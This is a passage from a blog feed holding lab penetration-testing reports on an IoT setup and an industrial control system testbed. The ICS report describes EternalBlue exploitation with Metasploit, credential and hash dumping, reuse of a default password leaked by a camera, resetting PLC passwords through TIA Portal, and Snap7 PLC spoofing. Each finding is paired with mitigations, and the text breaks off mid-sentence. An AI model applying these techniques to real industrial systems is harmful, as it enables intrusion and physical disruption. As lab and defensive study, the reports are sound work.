request to control or monitor the conveyor.</p><p>The payload can be dynamically updated by changing the URL parameters,which now include “var_5_title&#x3D;Conveyor_State” and “var_5_value&#x3D;true”.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image67.png" class=""><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image68.png" class=""><p>Figure 53 The payload is dynamically changed by modifying the URLparameters, sending updates to the SCADA system with different values</p><h3 id="Mitigations-7"><a href="#Mitigations-7" class="headerlink" title="Mitigations"></a>Mitigations</h3><p>To prevent unauthorized manipulation of the SCADA system through theNode-RED interface, it is essential to implement role-based accesscontrol (RBAC). This ensures that only authorized users have permissionto access or configure critical flow nodes responsible for communicationwith ICS devices. The HTTP input nodes in Node-RED should be restrictedto accept requests only from whitelisted IP addresses or those thatinclude valid authentication tokens, thereby reducing the risk ofcontrol commands being issued from untrusted or external sources.</p><h2 id="Smart-Plugin-Unauthorized-Access"><a href="#Smart-Plugin-Unauthorized-Access" class="headerlink" title="Smart Plugin Unauthorized Access"></a>Smart Plugin Unauthorized Access</h2><p>In the terminal, a nmap scan was first executed and port 9999 was foundopen under 192.168.88.186. So the Python script named ‘smart_plug.py’was used several times to get information related to the cloud serviceof this smart socket, including the email address, server address andbinding status.</p><img src="/2025/07/05/Penetration-testing-in-IOT-environment/image69.png" class=""><p>Figure 54 Remotely control smart socket devices and get informationabout network and cloud services</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>In this experiment, security risks associated with IoT deviceconfigurations, including <strong>tempering, spoofing, weak authentication,insufficient authorization, and sensitive information disclosure</strong>, wereidentified and demonstrated. Using tools like Nmap, we identified activedevices on multiple network segments and uncovered key vulnerabilitiessuch as unauthenticated access to Node-RED on port 1880 and weakconfigurations in devices like the Siemens S7-1200 PLC. Recommendationsinclude implementing stronger authentication methods, applying strictauthorization controls, disabling unnecessary services, and regularlyupdating systems. It emphasized the need for proactive security measuresto protect sensitive infrastructure in real-world environments.</p><h1 id="REFERENCES"><a href="#REFERENCES" class="headerlink" title="REFERENCES"></a>REFERENCES</h1><p>[1] Antonakakis, M. et al. 2017. Understanding the mirai botnet. <em>26thUSENIX Security Symposium (USENIX Security 17)</em> (Vancouver, BC, Aug.2017), 1093–1110.</p><p>[2] Beresford, D. 2011. Exploiting siemens simatic S7 PLCs. <em>Black HatUSA</em>. 16, 2 (2011), 723–733.</p><p>[3] Department of Electronic Engineering, Cape Peninsular Universityof Technology, Cape Town, South Africa et al. 2024. Implementingenhanced security in the zigbee joining process using elliptic curvediffie–hellman algorithm. <em>Electrica</em>. 24, 3 (Nov. 2024), 589–600.DOI:<a href="https://doi.org/10.5152/electrica.2024.23188">https://doi.org/10.5152/electrica.2024.23188</a>.</p><p>[4] Hui, H. et al. 2021. Vulnerability analysis of S7 PLCs:manipulating the security mechanism. <em>International Journal of CriticalInfrastructure Protection</em>. 35, (Dec. 2021), 100470.DOI:<a href="https://doi.org/10.1016/j.ijcip.2021.100470">https://doi.org/10.1016/j.ijcip.2021.100470</a>.</p><p>[5] Noman, H.A. and Abu-Sharkh, O.M.F. 2023. Code injection attacks inwireless-based internet of things (IoT): a comprehensive review andpractical implementations. <em>Sensors</em>. 23, 13 (Jan. 2023), 6067.DOI:<a href="https://doi.org/10.3390/s23136067">https://doi.org/10.3390/s23136067</a>.</p><p>[6] Wang, W. et al. 2020. Analyzing the attack landscape ofzigbee-enabled IoT systems and reinstating users’ privacy. <em>Proceedingsof the 13th ACM Conference on Security and Privacy in Wireless andMobile Networks</em> (New York, NY, USA, Jul. 2020), 133–143.</p><p>[7] Wytrębowicz, J. et al. 2021. Messaging protocols for IoTsystems—a pragmatic comparison. <em>Sensors</em>. 21, 20 (Jan. 2021), 6904.DOI:<a href="https://doi.org/10.3390/s21206904">https://doi.org/10.3390/s21206904</a>.</p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.kali.org/tools/metasploit-framework/%23msfvenom">https://www.kali.org/tools/metasploit-framework/#msfvenom</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>Java decompiler tool, <a href="https://github.com/skylot/jadx">https://github.com/skylot/jadx</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://github.com/homewsn/whsniff">https://github.com/homewsn/whsniff</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    
    <tags>
      
      <tag>IOT安全 工控安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Penetration testing of Industrial Control Systems(ICS)</title>
    <link href="/2025/07/02/Penetration-testing-of-industrial-control-systems/"/>
    <url>/2025/07/02/Penetration-testing-of-industrial-control-systems/</url>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>The penetration testing report for the ICS was completed by our team, with the goal of identifying as many risks as possible within industrial control systems. Starting from asset collection, we continuously attempted to discover new risk points within the system and combined them to escalate privileges,and draw the architectural diagram we understand. We exploited protocol vulnerabilities to remotely control the industrial tank. I primarily focused on the penetration testing aspect, while other team members participated in the penetration and were responsible for drafting the report. The testing was conducted entirely in a controlled environment, with no real-world disruptions.</p><h2 id="Methodology-Overview"><a href="#Methodology-Overview" class="headerlink" title="Methodology Overview"></a>Methodology Overview</h2><p>In this experiment, a systematic penetration testing approach is usedin. The process of attack consists of several steps:</p><p><strong>Information Gathering and Asset Identification.</strong> We performedextensive network scanning using tools such as Nmap to map theinfrastructure across multiple subnets (Field, Layer 3, and Cloudnetworks). The scans were used to identify active hosts, open ports,running services, and operating systems. This phase enabled us to builda comprehensive asset inventory and provided a baseline for furthervulnerability assessment.</p><p><strong>Vulnerability Assessment and Analysis.</strong> Based on the scan results, weanalyzed each asset for potential vulnerabilities. This includedidentifying misconfigurations, default credentials, outdatedcertificates, and known vulnerabilities such as EternalBlue(CVE-2017-0144) on Windows systems. We used both automated tools (e.g.,Metasploit modules) and manual verification to confirm the presence ofvulnerabilities.</p><p><strong>Exploitation and Proof of Concept.</strong> Where applicable and within thebounds of our test environment, we exploited the identifiedvulnerabilities to demonstrate their impact. For instance, we usedMetasploit to verify the existence of the EternalBlue vulnerability onWindows hosts and accessed the camera feed via weak credentials. Theseproofs-of-concept helped illustrate the real-world risk associated witheach vulnerability.</p><p><strong>Mitigation Recommendations.</strong> Following the exploitation, weformulated a set of mitigations for each identified vulnerability.Recommendations include updating patches, disabling outdated protocols(e.g., SMBv1), strengthening authentication mechanisms, and restrictingnetwork access via segmentation and firewall rules.</p><h1 id="Asset-Inventory"><a href="#Asset-Inventory" class="headerlink" title="Asset Inventory"></a>Asset Inventory</h1><h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p>In lab environment, attacker (kali) is bridged to connect to eth5. The192.168.5.0&#x2F;24 network belongs to the private IP address range definedby RFC1918 [3], which allows the lab environment to maintain internalcommunication while being isolated from external networks. The provided<em>OpenVPN</em> was deployed by configuration file to attacker machine andconnected the VPN client to the specified server, successfullyestablishing a secure tunnel to the lab environment.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> openvpn --config ./client.ovpn<br></code></pre></td></tr></table></figure><p>After verification, our terminal successfully obtained an IP addressfrom the 192.168.5.0&#x2F;24 network through the VPN shown in Figure 1 andwas able to access the devices and services within that subnet.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image1.png" class=""><p>Figure : Successfully OpenVPN connect to remote host.</p><h2 id="Identifying-Active-Hosts"><a href="#Identifying-Active-Hosts" class="headerlink" title="Identifying Active Hosts"></a>Identifying Active Hosts</h2><p>After connecting to the internal network, the first step is to identifyall devices within the three network segments. The following commandsare used to scan each segment for all visible IPs, while the scanresults shown in Figure 2.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sn <span class="hljs-number">172.20.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image2.png" class=""> <img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image3.png" class="">                                        <img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image4.png" class=""><p>Figure : nmap scan result for three network segments. The left image forthe result of 172.20.1.0&#x2F;24; the top-right image shows the result of172.20.50.0&#x2F;24; the bottom-right image presents the result of10.150.20.0&#x2F;24</p><h2 id="Service-Discovery"><a href="#Service-Discovery" class="headerlink" title="Service Discovery"></a>Service Discovery</h2><p>Building on the initial identification of active devices, <em>nmap</em> is usedfor further service and port scanning. The discovered IPs are stored inthree separate TXT files, which Nmap processes to perform acomprehensive scan on each listed IP. The active services in Bristolcyber security testbed is shown in Table 1, Table 2, Table 3.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/table1.png" class=""> <img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/table1-1.png" class=""> <img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/table2.png" class="">                    <img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/table2-1.png" class="">  <img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/table3.png" class="">  <p>The following three images show our Nmap scans for the 172.20.1.0&#x2F;24,172.20.50.0&#x2F;24, and 10.150.20.0&#x2F;24 networks, which helped us identifythe IP addresses present in each subnet.</p><h1 id="Survey-of-Testbed"><a href="#Survey-of-Testbed" class="headerlink" title="Survey of Testbed"></a>Survey of Testbed</h1><p>In this section, it outlines the process we followed to discovervulnerabilities and attempt their exploitation in the testbed. Based onour scanning results, we began by accessing all ports providing HTTPservices. For each open port, we manually reviewed the content toconfirm the target system and identify potential weak points. Eachtarget was then systematically tested by sending crafted requests andemploying known exploitation techniques, using automated tools such asnmap and manual interactions to understand service behavior and confirmvulnerabilities. The results of our experiments were compared to servicecharacteristics by repeatedly testing each HTTP port to identifyexploitable weaknesses.</p><h2 id="EternalBlue-Vulnerability-Main-Victim-172-20-1-70-172-20-50-160"><a href="#EternalBlue-Vulnerability-Main-Victim-172-20-1-70-172-20-50-160" class="headerlink" title="EternalBlue Vulnerability (Main Victim: 172.20.1.70 &amp; 172.20.50.160)"></a>EternalBlue Vulnerability (Main Victim: 172.20.1.70 &amp; 172.20.50.160)</h2><p>In Section 2.3, the system versions are identified. It is observed thattwo <em>Windows 7</em> hosts, 172.20.1.70 and 172.20.50.160, are running theSMB service. A well-known critical vulnerability in Windows 7 SMB, knownas <strong>EternalBlue</strong> (CVE-2017-0144[1], MS17-010[2]), is exploited toattack these two target hosts.</p><h3 id="Vulnerabilities-Identification"><a href="#Vulnerabilities-Identification" class="headerlink" title="Vulnerabilities Identification"></a>Vulnerabilities Identification</h3><p>The auxiliary module <em>smb_ms17_010</em> in the Metasploit framework wasfirst used to detect whether host 172.20.1.70 is vulnerable to theEternalBlue vulnerability. The scan result shows ‘Host is likelyVULNERABLE to MS17-010’, indicating that this Windows 7 Enterprise hostmost likely does not have a patch for the Eternal Blue vulnerabilityinstalled, or is still using the flawed SMBv1 protocol.</p><p>After specifying the attack payload, the logs show that the module hasstarted sending specially crafted SMB packets and performing variousmemory operations to trigger an overflow in the SMBv1 stack. The payloadis injected into the memory of the target system, shown in Figure 3 leftimage.</p><p>If the exploit is successful, the attacker can gain access to the remoteshell and even take over the target host completely. However, in thisexperiment, no shell was obtained, the attack could not be launchedsuccessfully, command log shown in Figure 3 right image.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image5.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image6.png" class=""><p>Figure : EternalBlue exploitation in 172.20.1.70 by Metasploit(<a href="https://www.metasploit.com/">https://www.metasploit.com</a>)</p><p>The presence of an active Meterpreter session in Figure 4 left indicatesthat the exploit has achieved remote code execution on the targetWindows 7 host. Even though a `RubySMB::Error::Communication-Error`can be seen, the fact that the session has been created and `sysinfo`is running successfully confirms that the exploit has at least partiallysucceeded in compromising the system. The getpid command in Figure 3right reveals the current process ID (e.g., 2272), confirming thatMeterpreter is attached to a privileged process. This level of accesseffectively grants the attacker complete control over the compromisedmachine.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image7.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image8.png" class=""><p>The network routes could be seen from the compromised host within aMeterpreter session in Figure 5 left, indicating which networks theinfected machine can access directly. Figure 5 right indicates the localARP (Address Resolution Protocol) cache. It provides IP-to-MAC addressmappings for devices recently communicated with by the compromised host.By examining these entries, attackers can discover other active systemson the network.</p> <img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image9.png" class=""> <img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image10.png" class=""><p>Figure : Route and ARP information of 172.20.1.70 by Metasploit.</p><p>Here credentials are fetched from memory that include NTLM and SHA1hashes for various users in the ICS-LAB-OT domain, which can beexploited to attempt to pass hash attacks, impersonate users, or elevateprivileges within the domain in Figure 6.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image11.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image12.png" class=""><p>Figure : MSV Credentials of 172.20.1.70 by Metasploit.</p><p>It results list multiple network interfaces, including the SoftwareLoopback Interface 1 (with IPv4 address 127.0.0.1), several MicrosoftISATAP Adapters, and physical Ethernet connections in Figure 7. Inparticular, Figure 7 demonstrates that while the Meterpreter session wasestablished through the IP address 172.20.1.70, the same physicalWindows machine also holds an interface assigned to 172.20.50.160. Inother words, the host is multi-homed or configured with multiple networkadapters, each belonging to a different subnet. This configurationallows traffic to traverse between the 172.20.1.x and 172.20.50.xnetworks on the same device.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image13.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image14.png" class=""><p>Figure : Ipconfig output of 172.20.1.70 by Metasploit.</p><p>Figure 8 demonstrates a successful hashdump command, extracting thelocal SAM database hashes from the compromised Windows machine. Thesehashes represent local accounts (e.g., Administrator, Guest, ICS-Admin)and can be cracked offline or reused in pass-the-hash scenarios.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image15.png" class=""><p>Figure : Hashdump in 172.20.1.70 by Metasploit.</p><h3 id="Exploitation-Mitigations"><a href="#Exploitation-Mitigations" class="headerlink" title="Exploitation &amp; Mitigations"></a>Exploitation &amp; Mitigations</h3><p>To address these vulnerabilities, it is important that administratorspromptly deploy the latest security patches from Microsoft addressingthe MS17-010 issue. Given that Windows 7 is now deprecated, a transitionto a more modern operating system is strongly advised. Moreover,disabling SMBv1 is critical in order to remove the primary attack vectorexploited by EternalBlue.</p><p>Beyond patching and system upgrades, a comprehensive security strategyshould incorporate network segmentation to ensure that SMB traffic isconfined strictly to trusted zones. This should be complemented by theimplementation of robust firewall rules to minimize unnecessaryexposure. Routine vulnerability assessments and continuous monitoring ofnetwork traffic are also essential components, as they facilitate theearly detection of emerging threats and enable prompt remedial action.</p><h2 id="Camera-Password-Leaking-Main-Victim-172-20-1-30-9081"><a href="#Camera-Password-Leaking-Main-Victim-172-20-1-30-9081" class="headerlink" title="Camera Password Leaking (Main Victim: 172.20.1.30:9081)"></a>Camera Password Leaking (Main Victim: 172.20.1.30:9081)</h2><h3 id="Vulnerabilities-Identification-1"><a href="#Vulnerabilities-Identification-1" class="headerlink" title="Vulnerabilities Identification"></a>Vulnerabilities Identification</h3><p>The Nmap scan for host 172.20.1.30 reveals two distinct services onports 8765 and 9081. It suggests that the auxiliary interface on port8765 may be misconfigured or partially implemented, potentially exposinginternal error details. In contrast, when we access 172.20.1.30:9081directly via a browser, the website loads normally in Figure 9. Itobserved that the device displayed sensitive information such as livevideo feeds and configuration details including username and password ofone host, leading to potential privacy breaches and serving as a pivotfor further network attacks in Section 3.3.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image16.png" class=""><p>Figure : Finding the stable video stream with the leaking password onPort 9081 for Host 172.20.1.30</p><h3 id="Exploitation-Mitigations-1"><a href="#Exploitation-Mitigations-1" class="headerlink" title="Exploitation &amp; Mitigations"></a>Exploitation &amp; Mitigations</h3><p>As it stands now, default credentials on devices such as cameras shouldbe replaced immediately with strong, unique authentication details,incorporating a mix of uppercase letters, lowercase letters, numbers,and special characters. Enabling HTTPS to secure communications betweenthe camera and its clients is strongly recommended to preventinterception of sensitive data. Network segmentation, strict firewallrules, or VPN-only access can further reduce exposure to unauthorizedusers. Finally, regular firmware updates and proactive monitoring ofaccess logs ensure that any anomalous activity is detected early andremediated swiftly, thereby maintaining a resilient security postureacross the entire infrastructure. And regular awareness sessions shouldreinforce that passwords must never be publicly displayed, and anysensitive login information should be stored in sealed envelopes kept inlocked cabinets or within secure password managers.</p><h2 id="PLC-HMI-Remote-Access-Control-Main-Victim-172-20-1-100"><a href="#PLC-HMI-Remote-Access-Control-Main-Victim-172-20-1-100" class="headerlink" title="PLC &amp; HMI Remote Access &amp; Control (Main Victim: 172.20.1.100)"></a>PLC &amp; HMI Remote Access &amp; Control (Main Victim: 172.20.1.100)</h2><p>From Section 3.2, the default account and password obtained from one ofthe [live site cameras (<strong>172.20.1.30:9081</strong>)]{.underline}:<em>engineer&#x2F;password123</em> allows direct login to [Windows 10 Workstation(<strong>172.20.1.100</strong>)]{.underline}, which can be used to fully control PLCand HMI in the filed site, shown in Figure 10.</p> <img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image17.png" class=""> <img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image18.png" class=""><p>Figure : Remote login to Windows 10 Workstation (172.20.1.100) bydefault password. Left image is the workstation login page with thecorrect username and password. Right image is the desktop page ofworkstation with another username and password pair.</p><p>Another password can be found in the desktop, which can be used to loginthe TIA administrator app. By doing so, many automations appsinformation can be leaked. The interface displays three primaryfunctions: Manage licenses &amp; download software, Manage software, andCentral user management, like the Figure 11.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image19.png" class=""><p>Figure : Successfully go into TIA Administrator Dashboard</p><p>It is easy to view the Siemens Automation License Manager and otherinstalled components such as TIA Portal V18, SIMATIC STEP 7 Safety anduser management functions on the ENG-WORKSTATION, shown in Figure 12.The interface provides options for searching for updates, installinglanguage packs and viewing individual software versions. Regularupdating of these tools ensures the compatibility, stability and safetyof industrial automation processes.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image20.png" class=""><p>Figure : Overview of Installed Siemens software in workstation machine.</p><p>The projects are in the desktop, which can be opened by TIA, and canconnect to the PLC and HMI successfully. After entering Tank_PLC&#39;sproject and attempting Go online operation, by selecting the PN&#x2F;IE(Profinet) interface and verifying the target device, the CPU model isconfirmed to be an S7-1200 (CPU 1212C AC&#x2F;DC&#x2F;Rly) and the IP address is172.20.1.10, shown in Figure 13 left image. After reviewing the HMI&#39;soverview screen and properties in Figure 13 right image, it was alsoconfirmed that the device has an IP of 172.20.1.9, even though it is inthe initial or blank configuration stage.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image21.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image22.png" class=""><p>Figure : TIA using &quot;Go online&quot; function connects to the PLC and HMIdevices. Left image represents that TIA in workstation can successfullysearch the PLC. The right image shows the HMI connected page.</p><p>Entering the User management settings window of the <em>S7-1200 PLC</em>, itwas found that attacker can change passwords for different access levelssuch as <em>‘Everybody’</em>, <em>‘admin’</em>, <em>‘Minimum’</em> or <em>‘Administrative’</em>,shown in Figure 14 left image. In general, by adjusting thesecredentials, security personnel can restrict access to control functionsor configuration parameters to unauthorized persons, thus improving thesecurity of the PLC. The Protection &amp; Security screen is where anattacker can configure access levels shown in Figure 14 right image andenable or disable security mechanisms such as block protection, HMIaccess restrictions, and more. If these parameters are modified, it islikely that the production process will be affected or threatened.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image23.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image24.png" class=""><p>Figure : TIA Permission configuration. The left image shows the attackercan reset the admin&#39;s password; the right image shows the access levelconfig in TIA, which allows full access.</p><p>Here, <strong>Connected Components Workbench</strong> shows the Micro850 controller’sgeneral settings in Figure 15. The vendor’s name is identified as**[Allen-Bradley]{.underline}**, and the controller project version isset to 1.0. This interface provides an overview of the PLC’s status andconfiguration, including details such as project name, firmware, andactive modules. Ensuring these parameters remain consistent and securehelps maintain reliable operation of the PLC. The Ethernet settings forthe Micro850 controller are shown in Figure 16. The user can enable ordisable DHCP, set a static IP (e.g., 172.20.1.x), and configure subnetmask, gateway, and inactivity timeouts. Properly assigning IP addressesand segregating the PLC from untrusted networks is crucial forminimizing unauthorized access in an ICS environment.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image25.png" class=""><p>Figure : Genera configuration page for the Micro850 PLC.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image26.png" class=""><p>Figure : Network port and IP address configuration for the Micro850 PLC.</p><p>Connected Components Workbench where a <strong>PV800 HMI</strong> project is open inFigure 17. The user can configure <strong>[Email Accountsettings]{.underline}</strong>, including SMTP server details, port 465, andpotential encryption TLS. Such a configuration is commonly used to sendalarm notifications or system alerts directly from the HMI. Properlysecuring these credentials is vital to prevent unauthorized users fromintercepting critical notifications or tampering with the email service.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image27.png" class=""><p>Figure : PV800 HMI Email account configuration page.</p><p>When attempting to connect to the Micro850, the user encounters a”Connection failed” prompt in Figure 18. This error can result frommismatched IP settings, firewall rules, or hardware availability issues.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image28.png" class=""><p>Figure : Failed connection attempt with the Micro850 controller.</p><p>We also looked at the Windows start menu of the engineering workstation,with a variety of ICS-related software installed shown in Figure 19,such as Rockwell Automation tools, Siemens TIA Portal, and the LicenseManager. The co-existence of software from different vendors reflectsthe multi-platform scenario common in modern industrial environments.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image29.png" class=""><p>Figure : ICS Engineering workstation application list in &quot;start&quot; menu.</p><h2 id="Leaking-Remote-Desktop-Main-Victim-172-20-1-70"><a href="#Leaking-Remote-Desktop-Main-Victim-172-20-1-70" class="headerlink" title="Leaking Remote Desktop (Main Victim: 172.20.1.70)"></a>Leaking Remote Desktop (Main Victim: 172.20.1.70)</h2><h3 id="Vulnerabilities-Identification-2"><a href="#Vulnerabilities-Identification-2" class="headerlink" title="Vulnerabilities Identification"></a>Vulnerabilities Identification</h3><p>During our investigation, the host at 172.20.1.70 is running Windows 7Enterprise N Service Pack 1 and belongs to the ICS-LAB-OT domain. Theopen ports: 135&#x2F;tcp (MSRPC), 139&#x2F;tcp (NetBIOS-ssn), 445&#x2F;tcp (SMB), and3389&#x2F;tcp (RDP) are typical of a Windows environment, confirming thesystem’s role as a server or workstation within the ICS network. Andport 3389 is associated with Remote Desktop Services, so our subsequentconnection attempt revealed a login prompt labeled”KEPWARE-SERVER\engineer,” demonstrating that we could reach the RemoteDesktop Protocol (RDP) interface over the network, shown in Figure 20.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image30.png" class=""><p>Figure : RDP login screen for 172.20.1.70</p><h3 id="Exploitation-Mitigations-2"><a href="#Exploitation-Mitigations-2" class="headerlink" title="Exploitation &amp; Mitigations"></a>Exploitation &amp; Mitigations</h3><p>Administrators must secure RDP to prevent data exposure. Enable NetworkLevel Authentication (NLA) and high-grade encryption to prevent sessionhijacking. Restrict access using firewall rules or VPNs, allowing onlyapproved IPs. Enforce strong passwords and multi-factor authentication(MFA) for added security.</p><p>Continuously monitor RDP logs for suspicious activity using centralizedlogging and intrusion detection. Keep RDP software updated and considersecure alternatives. These measures safeguard remote access and preventdata leaks</p><h2 id="S7-1200-PLC-Station-Main-Victim-172-20-1-10"><a href="#S7-1200-PLC-Station-Main-Victim-172-20-1-10" class="headerlink" title="S7-1200 PLC Station (Main Victim: 172.20.1.10)"></a>S7-1200 PLC Station (Main Victim: 172.20.1.10)</h2><h3 id="Vulnerabilities-Identification-3"><a href="#Vulnerabilities-Identification-3" class="headerlink" title="Vulnerabilities Identification"></a>Vulnerabilities Identification</h3><p>Network scan of 172.20.1.10 reveals HTTP (port 80) and HTTPS (port 443)services labeled “Introduction” and “Siemens AG,” respectively. Thedevice’s interface displays details about a Siemens S7-1200 station,indicating this may be a portal for industrial control configuration inFigure 21. Despite the interface requesting a username and password, nocredential combination successfully grants access, suggesting eitherincorrect default credentials or a locked-down interface.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image31.png" class=""><p>Figure : Login page of S7-1200 station, shows the login interface andthe basic information of S7-1200 station.</p><h3 id="Exploitation-Mitigations-3"><a href="#Exploitation-Mitigations-3" class="headerlink" title="Exploitation &amp; Mitigations"></a>Exploitation &amp; Mitigations</h3><p>Attempts to authenticate with default credentials failed, suggestingthey are either unused or blocked. Without a successful login, furtherexploitation was not possible.</p><p>Mitigation should go beyond patching and disabling defaults. If remoteaccess is unnecessary, isolate the control interface or place it on adedicated VLAN with strict filtering. If required, use a securitygateway or hop server for controlled access.</p><p>Minimize the attack surface by disabling non-essential services,applying vendor-provided updates, and conducting regular securityaudits. Ensure staff follows best practices for secure operations.</p><h2 id="SCADAROFT-10-150-20-100-8080-PHP-Page-10-150-20-100-8080-info-php"><a href="#SCADAROFT-10-150-20-100-8080-PHP-Page-10-150-20-100-8080-info-php" class="headerlink" title="SCADAROFT (10.150.20.100:8080) &amp; PHP Page (10.150.20.100:8080&#x2F;info.php)"></a>SCADAROFT (10.150.20.100:8080) &amp; PHP Page (10.150.20.100:8080&#x2F;info.php)</h2><h3 id="Vulnerabilities-Identification-4"><a href="#Vulnerabilities-Identification-4" class="headerlink" title="Vulnerabilities Identification"></a>Vulnerabilities Identification</h3><p>There is an Apache server running on port 8080, hosting a SCADA Croftapplication and a publicly accessible <em>index.php</em> page. By using pathtraversal tool to search the web page URL, an <em>info.php</em> page is alsofound. Figure 22 illustrates the result of path traversal by the tool of<em>gobuster</em>.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image32.png" class=""><p>Figure : Path traversal to the victim website by gobuster(<a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a>)</p><p>The SCADA Croft interface displays real-time data for tank operationsshown in Figure 23 left image, including flow and level values, whilethe <em>info.php</em> file reveals detailed information about the PHPenvironment in Figure 23 right image. These phenomena indicate possiblesafety hazards.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image33.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image34.png" class=""><p>Figure : The website pages in 10.150.100:8080. Left image is SCADA Croftdisplaying real-time tank status and operational parameters, while rightimage is PHP environment and configuration settings.</p><p>By opening the browser&#39;s built-in developer tools, additional files,including waterplant.php and factory.php, can be discovered, as shown inFigure 24.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image35.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image36.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image37.png" class=""><p>Figure : The additional PHP files in SCADA dashboard.</p><h3 id="Exploitation-Mitigations-4"><a href="#Exploitation-Mitigations-4" class="headerlink" title="Exploitation &amp; Mitigations"></a>Exploitation &amp; Mitigations</h3><ol><li><p><strong>Restrict Access:</strong> Protect the SCADA interface with strong    authentication and place it behind a VPN or firewall rules to ensure    only authorized personnel can reach the application.</p></li><li><p><strong>Remove or Secure <em>info.php</em>:</strong> Limit or remove public access to    the <em>info.php</em> file, as it exposes sensitive system details. If    required for debugging, place it behind authentication or enable it    only in a controlled environment.</p></li><li><p><strong>Disable Open Proxy Functionality:</strong> Verify that the server is not    acting as a forward proxy unless explicitly needed. If proxy    features are required, implement strict access control lists and    logging to prevent abuse.</p></li><li><p><strong>Harden Apache &amp; PHP Settings:</strong> Disable unnecessary modules,    enforce secure configurations, and regularly update both Apache and    PHP to address known vulnerabilities.</p></li></ol><h2 id="PLC-Spoofing"><a href="#PLC-Spoofing" class="headerlink" title="PLC Spoofing"></a>PLC Spoofing</h2><h3 id="Vulnerabilities-Process"><a href="#Vulnerabilities-Process" class="headerlink" title="Vulnerabilities Process"></a>Vulnerabilities Process</h3><p>View the TIA Portal project named 1200 Tank_Level_V18 in Figure 25,focus on the PLC Tags view for the CPU 1212C AC&#x2F;DC&#x2F;Rly, which wereuseful in the next steps.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image38.png" class=""><p>Figure 25: Path traversal to the victim website by gobuster(<a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a>)</p><p>In the Figure 26 left, the script read1.py has been prepared andexecuted several times, with each run displaying a Boolean result suchas ‘False’ or ‘True’ indicating the status of a specific bit in the PLCmemory, thus enabling real-time monitoring of changes. This indicatesthat the value of the bit will fluctuate depending on the internal logicof the PLC or the process conditions.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image39.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image40.png" class=""><p>Figure 26: read1.py Script Content &amp; Output</p><p>The script in the Figure 27 left uses the Snap7 library<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://pypi.org/project/python-snap7">[1]</span></a></sup>, by usingSnap7 in Python the user can programmatically change the discreteoutputs for testing or demonstration purposes, potentially simulating ortriggering events in a controlled process. In the terminal in the Figure27 